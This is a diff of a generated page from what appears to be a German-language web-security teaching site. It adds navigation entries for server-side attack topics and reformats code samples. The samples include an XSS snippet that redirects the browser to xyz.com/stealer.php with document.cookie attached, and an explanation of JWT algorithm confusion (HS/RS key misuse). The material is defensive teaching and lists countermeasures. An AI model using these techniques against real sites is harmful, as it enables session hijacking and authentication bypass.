@@ -879,11 +879,231 @@
   
   
     <li class="md-nav__item">
-      <a href="../../server-side-attacks/injection_attacks/" class="md-nav__link">
+      <a href="../../server-side-attacks/allgemein/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Angriffe
+    Allgemeines
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/file-uploads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File-Uploads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/path-traversals/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Path-Traversals
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/command-injections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command-Injections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/database-injections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Database-Injections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/ldap-injections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LDAP-Injections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/type-juggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Type Juggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/xml-based-attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XML-basierte Angriffe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/serialization-attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Serialisierungs-Angriffe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/http-request-smuggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Request Smuggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/SSTI/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSTI
     
   </span>
   
@@ -1603,8 +1823,8 @@ Benutzer direkt anvisieren kann.</p>
 <p>Beispiel für ein einfaches Javascript-Fragment welches ein Redirect auf
 einen externen Server (xyz.com) durchführt und als GET-Parameter die
 aktuellen Cookies übergibt:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://xyz.com/stealer.php?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
-<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://xyz.com/stealer.php?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Folgende Gegenmaßnahmen sollten implementiert werden:</p>
 <ul>
@@ -1644,13 +1864,13 @@ HTTP Parameter, HTTP Session Cookies oder mittels eines HTTP Headers
 </li>
 </ul>
 <p>Die Gesamtstruktur des Tokens ist:</p>
-<div class="highlight"><pre><span></span><code>    verification = algorithm(base64(header) + &quot;.&quot; + base64(content))
-    token = base64(header) + &quot;.&quot; + base64(content) + &quot;.&quot; + base64(hash)
+<div class="highlight"><pre><span></span><code>verification = algorithm(base64(header) + &quot;.&quot; + base64(content))
+token = base64(header) + &quot;.&quot; + base64(content) + &quot;.&quot; + base64(hash)
 </code></pre></div>
 <p>Ein Beispiel für einen Token (man kann dabei die drei durch einen .
 getrennten Base64-Bereiche erkennen. Da es sich um encoded JSON handelt,
 beginnen die beiden ersten Base64-Blöcke immer mit <em>eyJ</em>):</p>
-<div class="highlight"><pre><span></span><code>    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+<div class="highlight"><pre><span></span><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 </code></pre></div>
 <h3 id="problem-null-algorithmus">Problem: Null-Algorithmus</h3>
 <p>Ein grundlegendes Problem bei JWT ist, dass die Checksumme nur über den
@@ -1678,8 +1898,8 @@ Tokens) auf. Hier gibt es die Möglichkeit, dass ein Public-Key basiertes
 Verfahren zur Erstellung einer Signatur oder ein shared-key basiertes
 Verfahren zur Erstellung eines MACs verwendet wird.</p>
 <p>Die Methode zur Verifikation eines Tokens wird folgend aufgerufen:</p>
-<pre><code>    validate(token, key)
-</code></pre>
+<div class="highlight"><pre><span></span><code>validate(token, key)
+</code></pre></div>
 <p>Als erster Parameter wird das zu verifizierende Token übergeben, als
 zweiter Parameter wird der zu verwendende Key übergeben. Bei einem
 Signature-basierten Verfahren würde hier der public-key übergeben (da
@@ -1693,9 +1913,9 @@ Signatur-basiertes Verfahren gewählt, ist der Public-Key fast immer
 ausgeht, dass der Client immer ein Signatur-basiertes Verfahren
 verwenden wird. In dem Fall würde eine naive Implementierung folgenden
 Code wählen:</p>
-<pre><code>    # assume that token is an signature-based token
-    validate(token, public-key)
-</code></pre>
+<div class="highlight"><pre><span></span><code># assume that token is an signature-based token
+validate(token, public-key)
+</code></pre></div>
 <p>Es wird also der public key verwendet um die Signatur zu überprüfen.</p>
 <p>Ein Angreifer kann nun den public key herunterladen und selbst ein neues
 Token erstellen. Bei diesem setzt er den <em>alg</em> Wert auf <em>MAC</em>, generiert
@@ -1703,12 +1923,12 @@ also ein MAC-basiertes Token. Als geheimen Schlüssel für dieses Token
 verwendet er den public key der für die Überprüfung der Signatur
 verwendet wird. Wenn er nun dieses Token an den Service übergibt wird
 folgendes Code-Fragment aufgerufen:</p>
-<pre><code>    # token ist ein MAC-basiertes token
-    # die validate Funktion wird deswegen versuchen
-    # einen MAC zu berechnen und verwendet dafür
-    # den zweiten Parameter (public-key)
-    validate(token, public-key)
-</code></pre>
+<div class="highlight"><pre><span></span><code># token ist ein MAC-basiertes token
+# die validate Funktion wird deswegen versuchen
+# einen MAC zu berechnen und verwendet dafür
+# den zweiten Parameter (public-key)
+validate(token, public-key)
+</code></pre></div>
 <p>Da der Server (hardcoded) annimmt, dass eine Signatur überprüft wird,
 wird der public key (den der Angreifer zum Erstellen des MACs verwendet
 hat) als Schlüssel übergeben. Die validate Funktion liest nun das Token,
